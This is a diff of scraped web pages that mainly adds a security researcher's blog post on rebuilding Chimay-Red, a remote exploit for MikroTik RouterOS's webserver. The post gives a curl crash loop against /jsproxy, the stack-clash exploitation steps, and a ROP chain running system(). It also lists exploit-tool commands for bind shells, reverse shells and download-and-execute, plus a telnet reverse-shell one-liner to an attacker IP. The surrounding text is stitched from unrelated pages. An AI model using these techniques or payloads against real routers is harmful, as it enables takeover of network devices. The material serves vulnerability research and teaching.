@@ -6077,6 +6077,569 @@ Click Here
 Sign up for the newsletter
 Please sign up to get notified about new RouterOS version releases and other useful information!
 MikroTik app
+===============https://blog.seekintoo.com/chimay-red.html================
+Chimay-Red
+Seekintoo: blog
+seekintoo.com
+arcsight
+careers
+ctf
+research
+Chimay-Red
+Sat 28 April 2018
+By
+Dayton
+This post outlines and presents the rediscovery, vulnerability analysis and exploitation of a zero-day vulnerability that was
+originally discovered and exploited by the CIA's "Engineering Development Group"; remotely targeting MikroTik's RouterOS
+embedded operating system that was discovered during the "Vault 7" leak via WikiLeaks in March of 2017.
+Brief History and Background
+MikroTik (MK) is a Latvian company founded in 1996 and is known for its routers, switches and wireless network equipment.
+MikroTik is primarily famous for its embedded routing OS/hardware ecosystem: RouterOS and RouterBOARD.
+RouterOS is a uClibC Linux 3.3.5 based embedded OS with a proprietary software based routing suite and tool set written in C++ called "NOVA", and is MK's OS for nearly all of their hardware routing - switching products.
+RouterOS was originally designed for running on the RouterBOARD line of products, but as of the last few years, MK has opened the ability to run RouterOS on any almost any x86 hypervisor, baremetal x86 and more recently a AWS cloud offering.
+What really makes RouterOS and RouterBOARD an attractive option for many is its price point versus the competition with comparable performance and often extra features. A Cisco switch supporting MPLS will run you a few thousand dollars, while the competing MK offering with MPLS is 4x cheaper on average. Although managing an advanced configuration of RouterOS can be a bit of a curve if you are not familiar with systems like Cisco's IOS
+Note: The NOVA suite will not run outside of RouterOS (Eg. docker container) without serious hacks, which I will show in a later post. Having done this has opened up an easier method for exploit fuzzing and testing across many architectures and versions using QEMU or other instrumentable architecture virtualization.
+RouterBOARD 850gx3
+Plausible causes of interest (speculation)
+Why might the CIA be interested in exploiting these devices? Well for starters at any given time, between 1,500,000 and 2,000,000 MK RouterOS devices are exposed on the public net, as seen via shodan.io. These figures are on par with Cisco's exposure numbers and typically three times more exposed than D-Link and other usual suspects.
+Censys additionally reports that around 50,000 RouterOS devices currently have the HTTP management interface exposed to the public net. Top RouterOS device host countries include (in-order): Brazil, China, Indonesia and Russia.
+shodan.io device map: 1 == 1000 devices
+In combination with MK's current deployed scale globally and population in known targeted countries it seems reasonable that MK would be a prime candidate for such exploit development by a nation state. Similarly, found within the leaks is documentation for an exploit kit that compromises the AVTech Network Video Recorder code-named "Mealybug". As of posting this article, AVTech devices are the second most popular shodan search term, with around 130,000 results worldwide; Further re-enforcing the idea that the CIA has interest in developing exploits for very popular consumer hardware.
+Kaspersky also shows claims that tooling to exploit MK has been around "for a long time", as seen in the "Slingshot" APT report FAQ published this year.
+Vault 7
+Vault 7 aka. "Year Zero" was a mega-dump of approximately 23 projects and other various artifacts on Tuesday March 7th, 2017 from the CIA's Engineering Development Group (EDG) division at the Center for Cyber Intelligence (CCI)), a special development branch belonging to the CIA's Directorate for Digital Innovation (DDI) in Langley, Virginia.
+Comprising 8,761 documents and files, the leaks detailed abilities to compromise cars, smart TVs, browsers, phones and operating systems. Most, if not all, leaked projects were developed to preform electronic surveillance and/or cyber-warfare. Although no vulnerability sources or binaries were released, the leaked documentation has given attackers significant direction in rediscovering many of the same exploits.
+The Engineering Development Group is responsible for building certain notable tools as discovered in the leaks, such as: Hive, Cutthroat, Chimay-Red, Dark Matter, and Sonic Screwdriver. These tools were distributed to operators and partners when conducting proxy cyber-activities in regions where the US may face legal issues the partner state does not have as stringent laws against.
+Chimay-Red
+Background
+Chimay-Red is a zero-day exploit for the HTTP management/configuration/proxy webserver called www in MK RouterOS versions 6.x, originally targeting MIPS, MIPSEL, PPC, and x86 architectures. The exploit abuses a multithreaded remote stack collision vulnerability due to an implementation error with the usage of the compiler built-in alloca() by "allocating" a untrusted remotely supplied size value during a content-length header check. It is believed that Chimay-Red was originally used to implant HIVE or TinyShell onto the target system, as noted in the "hive-UsersGuide.pdf" document under: "7.1 (S) Installing Hive on MikroTik MIPS RouterOS 6.x using Chimay-Red".
+Documentation and version release notes suggest that development of the exploit was completed around 07/2015 (pg. 29 hive-UsersGuide.pdf):
+V2.9 (07/01/2015)
+• Adds a user-defined directory path for the .config and .log files to avoid read-only memory.
+• Adds support for MikroTik 6.x.
+Also found within hive-UsersGuide.pdf pg. 23 and image2015-4-27%2010:46:48.png is usage and other interesting information about Chimay-Red's inner workings:
+Exploit Usage:
+Operator usage Python traceback screenshot:
+Notice the hierarchy of the traceback from the Python interpreter. Arguments are passed into the entrypoint, which chooses the exploit module within ChimayRed_v3.7/bin/libs/<arch>/Exploit.py based off of detected or selected architecture and throws the payload in the given module to the given host and port.
+The throw_v6() (exploit version 6.x) function seems to use multiple sockets and predetermined or at least stored content-length and content values to some HTTP POST-able endpoint, which is a interesting hint towards where we might find this bug in the webserver binary.
+Unfortunately, due to the lack of information available within the leaks pertaining the Chimay-Red exploit, I was not unable to recover any more useful background or hints. However, I was confident that I had learned enough to tackle exploiting the vulnerability myself.
+Chimay-Red (my turn)
+Up to the challenge to try and see if I could match what these vulnerability researchers had accomplished in secret and more, I was excited to get started hunting. I had a couple other things going for me as well at the time, some MK MIPS based devices on-hand, the Python traceback screenshot and manuals from the leaks and a patched version of RouterOS released by MK fixing the said vulnerability:
+MK 6.38.5 release notes - link
+Initial Goals
+I didn't just want to replicate the exploit exactly, I wanted to make it even better. So I created a set of requirements for myself of what I think my version of the exploit should accomplish.
+The replica exploit will:
+At minimum, conform to the operators usage guide.
+Support the same architectures and commands.
+Note: Specific supported 6.x versions are unknown via the leaks.
+The replica exploit should:
+Support all 6.x versions and architectures
+Tooling for enumerating, downloading, analyzing and cataloging system firmware
+Needed for building ROP-chains and store metadata for approx ~200 different FW versions
+Containerize and optionally emulate any system firmware for fuzzing and testing.
+On The Hunt
+Extracting FW images:
+Binwalk can help us make quick work of identifying magic bytes within the firmware files in-order to extract the root SquashFS filesystem.
+$ binwalk -e ./routeros-<architecture>-<version>.npk ./routeros-<architecture>-<version>.npk
+4096
+0x1000
+Squashfs filesystem, little endian, version 4.0, compression:xz, size: 7109576 bytes, 1034 inodes, blocksize: 262144 bytes, created: 2016-10-05 12:07:28
+Webserver Binary Location:
+$ find $firmware-images.extracted/squashfs-root -name "www" -type f
+firmware-images.extracted/squashfs-root/nova/bin/www
+$ file $firmware-images.extracted/squashfs-root/nova/bin/www
+www: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+WWW Reverse Engineering Notes
+Full reverse engineering analysis of the www webserver binary is outside the scope of this post. Although I will provide some important notes:
+One thread per socket connection.
+Each connection is allocated 128KiB (0x20000) of stack space per thread
+This is set by pthread_attr_setstacksize in main()
+Each thread stack space is allocated ontop on the previous thread.
+|
+|
+^-------------^ < Thread2 ESP
+|
+|
+|
+|
+|
+Thread1
+|
+|
+|
+^-------------^ < Thread1 ESP
+|
+|
+|
+|
+|
+Thread0
+|
+|
+|
+^-------------^ < Thread0 ESP
+Automatically restarted on crash after three seconds
+The loader arbiter (/nova/bin/loader) controls this via signal handling and PID tracking.
+ELF Mitigations:
+Architecture
+NX
+CANARY
+PIE
+RELRO
+x86
+YES
+NO
+NO
+NO
+ARM
+YES
+NO
+NO
+NO
+POWERPC
+YES
+NO
+NO
+NO
+SMIPS
+NO
+NO
+NO
+NO
+MMIPS
+NO
+NO
+NO
+NO
+MIPSBE
+NO
+NO
+NO
+NO
+TILE
+NO
+NO
+NO
+NO
+Analyzing the difference with IDA and BinDiff
+By looking at the difference in the assembled sections of the binary of the known vulnerable version and the known fixed version gave a clear look into what exactly has been patched to fix the vulnerability.
+Note: A good BinDiff trick is to look for lowest similarity with high confidence
+6.38.4 versus 6.38.5 BinDiff subroutine similarity chart
+It appears Request::readPostData(int32_t arg1, int32_t arg2) would be a prime candidate to diff due it being the function with the highest confidence rating of a altered subroutine at a score of "0.82".
+Left: 6.38.4 (x86) | Right: 6.38.5 (x86)
+I could not get IDA to produce psuedocode for the subroutine, so instead I have hand written it below (correct me if wrong, please):
+int header;
+int recv_len;
+int *alloca_sp
+int content_length_value = 0;
+char *content_length;
+// Block until request received
+recv_len = sock::recv(32768);
+// Set the name of the header we are looking for
+string::string(&content_length, "content_length");
+// Grab given header_name given the raw request.
+header = Headers::getHeader(&content_length, &content_length_value);
+if (!header) {
+goto exit;
+} else if (recv_len == 0) {
+goto exit;
+} else if (recv_len < content_length_value) {
+goto exit;
+}
+// Stack colision vulnerability due to insufficient content_length_value filtering as seen above.
+// This call is optimized to "sub eax, esp" with most compilers.
+alloca_sp = alloca(content_length_value);
+// Read content_length_value bytes from socket and write
+// into newly likely improperly allocated stack space. (SIGSEGV)
+istream::read(alloca_sp, content_length_value)
+So what's the vulnerability?
+Since no filtering/conditionals are happening to ensure that the content-length_value does not exceed the thread stack page size limits, the vulnerability could be triggered by passing a negative number into the content-length header. This results in a alloca() *size argument far exceeding the size of the current connection thread stack frame size of 128KiB during a logical AND of the size value to enforce stack alignment.
+alloca() in-lined assembly snippet from readPostData():
+8055a56:
+8d 42 10
+lea
+eax,[edx+0x10] << load effectively content_length_value from edx+0x10 into eax
+8055a59:
+83 e0 f0
+and
+eax,0xfffffff0 << AND content_length_value to enforce stack alignment at mutliples of 16 bytes
+8055a5c:
+29 c4
+sub
+esp,eax
+<< "allocate" space by subtracting the stack pointer (esp) by content_legth_value
+Example alloca() alignment in Python:
+>>> content_length_value = -1
+>>> (content_length_value - 0x10) & 0xFFFFFFF0
+4294967264
+As you can see in the example alignment calculation, due to the logical AND preformed on the content_length_value to enforce the stacksize to be in alignment with STACK_ALIGN (16 bytes on most architectures), an integer overflow has occurred. This will cause alloca() to attempt to subtract the stack pointer by a massive amount, exhausting additional thread stack space causing the webserver to SIGSEGV when that unallocated memory is improperly accessed during the next threaded connection or by other arbitrary access.
+The patched version ensures no such overlaps can occur by first validating the content_length_value and resizing before reaching alloca().
+Identifying a POST method URL endpoint on the webserver:
+To discover a URL endpoint on the webserver that I could actually POST arbitrary data into, I fired up WireShark and browsed to the login page of the management server and logged in. This shows a POST endpoint available in the working directory called /jsproxy:
+PoC ()
+At this point we should have a proof of concept that we can use to test if the target webserver crashes. Simply passing a negative one into the content_length header should be enough
+to wrap the integer and overallocate to crash the server. To test, we can craft this header with CURL in a POST request and spam the webserver with it in a loop :).
+CURL PoC:
+while ; do curl -X POST -H "Content-Length: -1" -d '{"foo":"bar"}' http://<target>:80/jsproxy && sleep 0.5; done
+ASCIInema PoC demo:
+As you can see, the webserver crashes and is automatically restarted every three seconds.
+Building the Exploit
+For a test target, I just installed RouterOS within VirtualBox and bound the first interface to a host-only adapter. I won't be covering this in particular, in-depth instructions can be found on Google.
+Most of the tools I used in this section and recommend others to use for embedded Linux exploit development/research:
+pwntools
+MIPSROP
+GDB
+GDB PEDA
+GEF
+Binutils Collection
+Getting a debugger on the target
+I'm going to need a debugger on my target in-order to further understand and analyze the crash before going any further.
+This is a fairly simple and straightforward process thanks to MK enabling something called devel-login, which will allow us to gain a root shell.
+Mount both partitions from RouterOS Virtual Disk
+$ mount /dev/sda1 /mnt/disk1
+$ mount /dev/sda2 /mnt/disk2
+Create a file called devel-login in /dev/disk2/etc/
+$ touch /dev/disk2/etc/devel-login
+Copy uClibC compiled gdbserver to /mnt/disk1/flash/bin
+$ cp ./gdbserver /mnt/disk/flash/bin
+Connect over telnet to target and login as devel-login, blank password:
+MikroTik 6.38.4 (stable)
+MikroTik Login: devel-login
+Password:
+BusyBox v1.00 (2017.03.02-08:29+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+#
+Run the gdbserver previously copied into /flash/bin/gdbserver.i686:
+$ /flash/bin/gdbserver 0.0.0.0:4444 --attach $(pidof www)
+You can now do remote debugging with GDB:
+$ gdb -q
+gdb-peda$ target remote 192.168.56.124:4444
+Exploit Building Preconditions and Requirements
+To avoid NX (non-executable) memory protections and ASLR (Address-Space-Layout-Randomization) on (x86, ARM, POWERPC), typical return-oriented techniques can be employed to reuse existing executable memory once execution flow via the IP (Instruction Pointer) is controlled. Therefore on systems without NX applied (MIPS* and TILE); NX does not need to be bypassed and has the ability to execute code on the stack. For my purposes I will be using a ROP (Return-Oriented-Programming) chain every time for every architecture regardless.
+Why? Because why not? ROP chains work on both systems with and without NX protections, can't hurt ¯_(ツ)_/¯.
+But what this still means is the attacker (me) must have the target version of webserver (www) present to gather instruction offsets for ROP. This is where MikroDB comes in as you will see shortly in the post.
+Detecting architecture remotely
+Architecture is discovered remotely via a protocol called MNDP (MikroTik Neighbor Discovery Protocol).
+MNDP
+The MikroTik Neighbor Discovery Protocol (MNDP) eases network configuration and management
+by enabling each MikroTik router to discover other connected MikroTik routers and learn
+information about the system along with features which are enabled. The MikroTik routers
+can automatically use learned information to set up some features with minimal or no configuration.
+MNDP features:
+works on IP level connections
+works on all non-dynamic interfaces
+distributes basic information on the software version
+distributes information on configured features that should interoperate with other MikroTik routers
+The type of information usually associated with MNDP packets are:
+age
+address
+identity
+interface(s)
+mac-address
+platform
+software-id
+unpack version
+uptime,
+hardware info
+To take use of MNDP for detecting the target architecture, its usage is simplified as so:
+Send four null bytes ('\0\0\0\0') to 255.255.255.255:5678.
+Wait a little while.
+Receive information back on 0.0.0.0:5678.
+Detecting version remotely
+Detecting the remote version is simple for majority of the exposed services.
+Here's a few:
+HTTP
+Version string in HTML GET request data from maintenance webpage
+FTP
+Version string in banner
+220 MikroTik FTP server (MikroTik 6.38.4) ready
+TELNET
+Version string in banner
+MikroTik v6.38.4 (stable)
+MNDP
+Version string in version entry within MNDP packet.
+The obvious caveat of using MNDP to retrieve this information, is that the attacker is required to be within the targets subnet.
+Abusing alloca(); a multithreaded tango
+man 3 alloca:
+void *alloca(size_t size)
+...
+The
+alloca() function allocates size bytes of space in the stack frame of the caller.
+If the allocation causes stack overflow, program behavior is undefined.
+The procedure is as follows:
+Two socket connections to the webserver are established, causing www to create two threads to handle the connections. Both threads are expecting HTTP headers and so they are both blocking on a read operation.
+Note: Gray represents the space already taken up on the stack for existing data.
+Thread1 is sent HTTP headers with an HTTP Content-Length string equivalent to 0x29000 (THREAD_STACK_SIZE + len(payload) + SAFE_SPACE). Once headers are received, Thread1's initial read operation finishes. It performs the alloca, subtracting its stack pointer by 0x29000, which places its pointer for *buf at 0x8000 bytes down from the top of Thread2's stack:
+Thread1 is then sent approximately 0x1000 bytes of the 0x29000 it is expecting alligned for istream::read(). This advances the *buf pointer index used by istream::read() up the stack, closer to Thread2's current stack pointer. Thread1 continues waiting as it has not yet received the full amount of data expected (0x29000).
+Thread2, still waiting on its initial network read, is sent HTTP POST headers with a Content-Length string equivalent to approximately the size of the payload (0x8000 as an example), which it uses for its own alloca, subtracting from its stack pointer. Coordinating this length carefully places it precisely where the *buf pointer in Thread1 istream::read() currently points, in the below diagram I have placed it just above so it's visible. Thread2 then calls istream::read() to receive its HTTP Content-Data, causing it to block while waiting to read in data.
+Thread1 is then sent the payload data it is waiting to receive, which is stored starting at its current *buf index in istream::read(), and overwrites where Thread2's stored return address is for istream::read().
+A return from istream::read() can then be triggered by simply closing the connection. Once Thread2 returns, EIP is restored from the overwritten return address value and execution flow is controlled.
+return address overwrite calculation eg:
+ADDR_SIZE = 8
+SAFE_SPACE = 0x1000
+THREAD_STACK_SIZE = 0x20000
+PAYLOAD_LEN = len(payload) # 0x8000
+>>> hex(((THREAD_STACK_SIZE + SAFE_SPACE + PAYLOAD_LEN) - PAYLOAD_LEN) - ((SAFE_SPACE - 0x10) & 0xFFFFFFF0) - ADDR_SIZE)
+'0x20008'
+ROP
+Note: I'll only be explaining the ROP technique for the x86 architecture, as explaining all the techniques would be a blog post in itself. This technique was originally discovered by GitHub user wxsarcher for RouterOS 6.x at BigNerd's version of Chimay-Red. At the time of researching this vulnerability I was not aware of the efforts by BigNerd to also uncover the bug, so big props to BigNerd for being the first (that I can see) to release a working PoC for Chimay-Red! I recommend everyone go and checkout his exploit stuff for Chimay-Red as well, and if you can help him support more architectures, the project is in need of additional architecture research.
+Psuedocode for technique to execute: ls -la
+system_chunks = [134512899, 134513152, 134512899, 134512854, 134514868, 134514240, 134512693]
+#
+("s", "y", "s", "t", "e", "m", "\x00")
+cmd_chunks = [134512885, 134512899, 134512682, 134512891, 134512885, 134516284, 134512693]
+#
+("l", "s", " ", "-", "l", "a", "\x00")
+writable_segment_addr = 134514680
+jmp_eax = 134514248
+char_size = 1
+command = bytes()
+char_pointer = 0
+for address in system_chunks:
+command += rop.call(<strncpy>, args=(<writeable_segment_addr> + char_pointer, address, char_size))
+char_pointer += 1
+system = bytes()
+char_pointer = 0
+for address in cmd_chunks:
+system += rop.call(<strncpy>, args=((<writeable_segment_addr> + (len(system_chunks) + addr_size) + char_pointer, address, char_size))
+char_pointer += 1
+|<<<< rop.call(<dlsym>, args=(0, system))
+|
+|
+Note: [EAX] = resultant pointer of dlsym() call
+|
+|>>>> rop.call(jmp_eax, args=(command,))
+What it do?
+First finds the address of a readable character for each character in the string "system\x00" and our desired command + "\x00" to be run by system().
+Next a writeable_segment_addr in the binary address ranges is searched for to be able to write x amount of characters to via strncpy(), (commonly the bss section is used) where x == len("system\x00"+command+"\x00")
+system_chunks character addresses are then written to the writeable_segment_addr using strncpy(), incrementing the writeable_segment_addr - char_pointer counter value each time a character is written.
+command_chunks character addresses are then written to (writeable_segment_addr + len("system\x00") + addr_size)
+dlsym() in the binary PLT entry table is then called with the target symbol being the original writeable_segment_addr which should be pointing to >
+"system\0"
+The result of the call to dlsym() now should be a pointer to the system() function. This pointer is returned in EAX and jumped to with a jmp eax gadget with its argument register (EBP) set to (writeable_segment_addr + len("system\x00") + addr_size) which should be pointing to > "ls -la\0"
+Produced gadgets:
+Writing "system\0":
+0x0000:
+strncpy strncpy(134594588, 134512899, 1)
+0x0004:
+0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
+0x0008:
+0x805c01c arg0
+0x000c:
+0x8048103 arg1
+0x0010:
+0x1 arg2
+<snip>
+Writing "ls -la\0":
+0x008c:
+strncpy strncpy(134594604, 134512885, 1)
+0x0090:
+0x805212e <adjust: pop esi; pop edi; pop ebp; ret>
+0x0094:
+0x805c02c arg0
+0x0098:
+0x80480f5 arg1
+0x009c:
+0x1 arg2
+<snip>
+Calling dlsym() & jmp_eax():
+0x0118:
+dlsym dlsym(0, 134594588)
+0x011c:
+0x804ffd9 <adjust: pop ebx; pop ebp; ret>
+0x0120:
+0x0 arg0
+0x0124:
+0x805c01c arg1
+0x0128:
+jmp_eax jmp_eax(134594604)
+0x012c:
+b'zaad' <pad>
+0x0130:
+0x805c02c arg0
+Result:
+system("ls -la")
+Once the ROP chain has been built and packed for the given endianess, it can be sent during the payload stage as seen in the earlier procedure when abusing alloca(). Each gadget in the chain should be executed thanks to our return address overwrite earlier.
+MikroDB
+MikroDB is a sister application to Chimay-Red that allows easier portability and extendability of the exploit toolkit. its what allows hundreds of different types of ROP chains to be built without having access to the target binary itself; and it does this through a process like so:
+Enumerates all stable vulnerable RouterOS 6.x versions available for download from MK's archive for all architectures by bruteforcing version numbers via HEAD requests.
+Downloads all enumerated firmware images into a storage directory.
+Catalogs the filename and SHA256 hash of the firmware file into a local SQLite database file.
+Decompresses and extracts the webserver binary www from the SquashFS filesystem stored within NPK firmware image.
+Stores and catalogs the filename and SHA256 hash of the www webserver binary into the SQLite database file.
+For each webserver binary extracted, the file is ran through a ROP chain building process and information for building selected ROP-chain repeatably is stored in the SQLite database file.
+Once MikroDB is finished its process, it can be portably used with Chimay-Red to build ROP-chains on the fly thanks to the stored offsets in the database, instead of downloading and extracting and storing 5GB+ of FW images in-order to facilitate attacking any version and architecture. This 500KB database can be built once in only a couple hours and kept forever. For your convenience, a prebuilt database is included in the source code repository for this project!
+MikroDB was able to enumerate 352 vulnerable versions (as of writing this, it fluctuates oddly..) across all of their supported architectures, a table is represented below showing vulnerable versions available per architecture:
+Architecture
+# Vulnerable versions
+x86
+56
+ARM
+45
+POWERPC
+57
+SMIPS
+56
+MMIPS
+25
+MIPSBE
+57
+TILE
+56
+MikroDB in action against x86: (skip through)
+Wrapping it all together
+Usage:
+usage: chimay_red.py [-h] -t TARGET [-s] [-d] [--architecture ARCHITECTURE]
+[--gdbport GDBPORT] [--binary BINARY]
+[--shellcode SHELLCODE] [--vector VECTOR]
+[--leakrounds LEAKROUNDS] [-v] [--version]
+command
+positional arguments:
+command
+command function to run on target, see below for
+options
+optional arguments:
+-h, --help
+show this help message and exit
+-t TARGET, --target TARGET
+target address:port
+-l LHOST, --lhost LHOST
+local address to bind to for listening for connectback commands
+-s, --shell
+return interactive shell as main payload (default)
+-d, --debug
+enable debugging mode
+--architecture ARCHITECTURE
+target architecture (will detect automatically if
+target in route table range)
+--gdbport GDBPORT
+port to use when connecting to remote gdbserver
+--binary BINARY
+target binary (www)
+--shellcode SHELLCODE
+custom (optional) shellcode payload binary filepath
+--vector VECTOR
+optional vector type, see below for options
+--leakrounds LEAKROUNDS
+amount of rounds to leak pointers, higher is better,
+but takes more time
+-v, --verbose
+Verbosity mode
+--version
+show program's version number and exit
+commands:
+COMMAND
+FUNCTION
+bindshell
+create a bindshell
+connectback
+create a reverse shell
+download_and_exe
+connect back and download a file to then execute
+ssl_download_and_exe
+connect back and download a file via SSL to then execute
+write_devel
+write "devel-login" file to allow developer account login
+write_devel_read_userfile
+in addition to enabling developer logins, read back the users file
+custom_shellcode
+run arbitrary shellcode from `--shellcode` binfile
+custom_shell_command
+run a arbitrary $sh one liner on the target
+vectors:
+default: (mikrodb)
+[Generic]
+mikrodb:
+use the accompanying mikrodb database to load offsets
+based off of detected remote version to build a ROP chain.
+build:
+build a ROP chain from scratch given the www binary matching
+the remote version running.
+[Experimental]
+brute: bruteforce uclibc base offset.
+leak:
+leak pointers from shared libraries to give better odds of
+finding base offset of uclibc.
+examples:
+./chimay_red.py connectback --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=mikrodb
+./chimay_red.py connectback -d --target 192.168.56.124:80 --lhost=192.168.56.1 --vector=build
+--binary $PWD/www --gdbport 4444
+==================================================
+|
+_______
+_
+___
+__|
+| / ___/ /
+(_)_ _
+___ ___ ______/ _ \___ ___/ /|
+|/ /__/ _ \/ /
+' \/ _ `/ // /___/ , _/ -_) _
+/ |
+|\___/_//_/_/_/_/_/\_,_/\_, /
+/_/|_|\__/\_,_/
+|
+|
+/___/
+|
+==================================================
+Additional tips & tricks
+Getting a reverse shell without existing telnet access for devel-login
+mknod /tmp/pipe p;telnet <attacker_ip> <attacker_port></tmp/pipe|bash>/tmp/pipe
+This command creates a READ|WRITE fifo-file pipe in memory using mknod and redirects the standard-in and out of bash to the pipe and out through telnet.
+Sending text to the LCD
+"echo hello world > /dev/lcd"
+image courtesy of BigNerd - Chimay-Red Github
+See it live!
+Chimay-Red in action:
+Chimay-Red in debug mode:
+Conclusions & Future Work
+So did I accomplish my goals in the end? Well almost.
+In the end I was able to exploit every stable release version for all architectures except TILE and ARM. Now you are probably wondering, "what the hell is TILE". It is for that specific reason why I was unable to support TILE. As for ARM, I have not had enough time to go through and test the ROP builder for ARM as of yet, but I hope to fully support the architecture soon.
+I was also unable to complete the command for custom_shellcode as I am not able to get a mprotect ROP-chain working for all architectures and versions.
+As for "Containerize and optionally emulate any system firmware for fuzzing and testing", I will be going over how to containerize and mass deploy swarms of RouterOS systems via Docker and libvirt in a later post so stay tuned :).
+Ideas that didn't work:
+I attempted to leak pointers from the heap by using a content-length of zero and sending small amounts of data into istream::read(). This resulted in some valid addresses being leaked from various areas of the process memory, although I was unable to use it in any way to predict ASLR offsets because of a lack of predictability in the leaked addresses. If the leaked addresses were in fact predictable in terms of their location in the process memory in correlation to the other threads and library load order on some systems it could possibly allow ROP chains to be crafted on the fly without the need of the target source webserver binary version.
+Chimay-Blue?
+Recently MK has fallen victim to an 0day against its Samba service within RouterOS: CVE-2018-7445, allowing for remote code execution. I hope to continue to build upon my existing Chimay-Red framework to integrate it. This should allow me to expand the 6.x exploit set past 6.38.5 and up to 6.41.2.
+Famous MK Forum Quotes:
+"Also, it seems that this exploit may not be functional in RouterOS version above v6.30.1"
+https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
+"After a thorough code review, we could not find anything hinting to the described issues."
+https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
+In the end, a span of approximately four years elapsed since the vulnerability was introduced until the time it was fixed. Four years should be enough for multiple competent code reviews to catch a blatant integer overflow in a critical function like reading user POST data. The fact this small issue was not discovered and fixed for so long, leads myself and I'm sure others to believe MK doesn't do code reviews or does not complete them often. If you are reading this MK, maybe stop custom writing and maintaining your: Webserver, Samba Server, RADIUS server, SSH server, TELNET server, FTP server, etc. Clearly you can't.
+References
+https://wikileaks.org/ciav7p1/cms/page_16384604.html
+https://wikileaks.org/ciav7p1/cms/page_16384512.html
+https://securelist.com/apt-slingshot/84312/
+Software Used
+Analysis:
+- IDA Pro
+- Binary Ninja
+- BinNavi
+Exploit:
+- pwntools
+- GDB
+- GDB PEDA
+- GEF
+- Binutils Collection
+Download
+Chimay-Red and MikroDB are freely available for download on GitHub:
+https://github.com/seekintoo/chimay-red
+About the Author
+Dayton Pidhirney is a Cybersecurity Researcher at Seekintoo. Dayton is an EE geek and is also Co-Founder of FirePick Services LLC., a maker-grade pick and place machine. Dayton's desk always has wires, screws, components and tools on it. Always. Seriously Dayton, clean your desk...
+Comments, concerns, and corrections are welcome and not triaged by any marketing machine we are aware of: dpidhirney (at) seekintoo (dot) com
+Categories
+arcsight
+careers
+ctf
+research
+Social
+twitter
+linkedin
+github
+© 2018 Seekintoo Ltd. and/or its affiliates.
+All rights reserved. Privacy Policy
 ===============https://www.fofa.so/result?qbase64...================
 FOFA Pro - 错误
 问题反馈
@@ -6117,1423 +6680,311 @@ English
 &nbsp &nbsp 简体中文
 zh-CN
 版权所有 © 白帽汇 2015 - 2019. All Rights Reserved 粤ICP备16088626号. Version 3.4.272
-===============https://www.balticnetworks.com/routeros-level-5-license.html================
-MikroTik RouterOS Level 5 License
-JavaScript seems to be disabled in your browser.
-You must have JavaScript enabled in your browser to utilize the functionality of this website.
-Cart
-Checkout
-Login
-Welcome, please log in here
-Baltic Networks Logo
-(888) 929-3610 Affordable Wireless Solutions
-0 products in cart.
-Cart
-Checkout
-You have no items in your shopping cart.
-Catalog
-Search
-Search:
-Catalog
-Home
-Manufacturers.
-Alpha Wireless
-American Tower.
-Free Standing
-Self Supporting.
-Standard Self Supporting
-1810 Self Supporting
-Heavy Duty Self Supporting
-Aranet
-MikroTik.
-New MikroTik Products
-Antennas
-CloudCore Routers
-Enclosures & Cases
-Ethernet Routers
-Power Supplies
-RouterBOARD
-RouterOS License
-Switches
-Wireless Cards
-Wireless for Home and Office (SOHO)
-Wireless Solutions for WISPs
-MikroTik Accessories
-Clearance
-LTE
-Maxxwave.
-New Maxxwave Products
-Antennas and Antenna Accessories
-Enclosures and Rackmount Adapters
-Fiber Modules and Fiber Patch Cables
-Pigtails and Patch Cables
-Power Supplies and PoE Injectors
-RouterMaxx Routers
-UBTik
-Maxxwave Accessories
-Ubiquiti.
-New Ubiquiti Products
-airFiber.
-Radios
-Antennas
-Accessories
-airMAX.
-Antennas.
-airMAX AC Sector Antenna
-airPrism Sector Antenna
-RocketDish Antenna
-RocketDish AC Antenna
-RocketDish LW
-airMAX Sector Antenna
-airMAX Omni Antenna
-airMAX Yagi Antenna
-IsoBeam
-Horn 5 Antenna
-CPE.
-NanoBeam AC
-LiteBeam AC
-NanoStation AC
-PowerBeam AC
-IsoStation AC
-PowerBeam AC ISO
-AP.
-Rocket AC
-LiteBeam AC AP
-Rocket Prism AC
-PrismStation AC
-Accessories
-Legacy.
-IsoStation M
-LiteBeam M5
-NanoBeam M
-NanoBridge M
-NanoStation M
-PowerBridge M
-PowerBeam
-PowerBeam M5 ISO
-Rocket M
-EdgeMax.
-Routing.
-EdgeRouter
-EdgePoint
-EdgeRouter X
-EdgeRouter X SFP
-EdgeRouter Lite
-EdgeRouter PoE
-EdgeRouter PRO
-EdgeRouter Infinity
-EdgeRouter 4
-Switching.
-EtherMagic
-ToughSwitch
-EdgeSwitch
-EdgeSwitch 8-150w
-EdgeSwitch Lite
-EdgeSwitch 12F
-EdgeSwitch 16XG
-Accessories
-U Fiber.
-CPE.
-UFiber Nano G
-UFiber OLT
-Accessories.
-Fiber Modules & Cable
-GPON OLT SFP Transceiver
-PowerModule
-TOUGHCable
-UniFi.
-LED Panel
-Wireless.
-UniFi AP AC LITE
-UniFi AP AC LR
-Routing and Switching
-Accessories
-Legacy
-UniFi Video.
-Accessories
-Cameras
-Accessories for Ubiquiti Products.
-Cable and Connectors
-Wireless Cards
-Power Supplies
-mFi
-Clearance
-Baicells.
-Basestations
-CPEs
-Accessories
-LTE Starter Kits
-BEC Technologies
-Cambium Networks.
-New Cambium Products
-ePMP 1000.
-Antennas
-Radios
-ePMP 2000
-ePMP 3000
-ePMP Force.
-Antennas
-PMP450.
-Access Points
-Antennas
-License Keys
-Subscriber Modules
-PTP450
-PTP 550
-PTP650.
-License Keys
-Extended Warranty
-Connectorized Radio
-Integrated Radio
-PTP820.
-Radios
-PtP Kits
-Extended Warranty
-Activation Key
-cnMatrix
-cnPilot
-cnRanger
-cnReach
-Cambium Accessories
-Cisco Meraki.
-Access Points
-Antennas
-Power Management
-Licenses
-CyberData
-DASAN Zhone Solutions.
-Whole Home WiFi
-Optical Network Terminal (ONT)
-Optical Line Terminal (OLT)
-Network Management
-Accessories
-CPE
-Digital Loggers
-EnGenius.
-Controllers & Switches
-Gateways/Routers
-Indoor Access Points/Bridges
-Outdoor Access Points/Bridges
-Phone Systems
-PoE
-USB Adapters
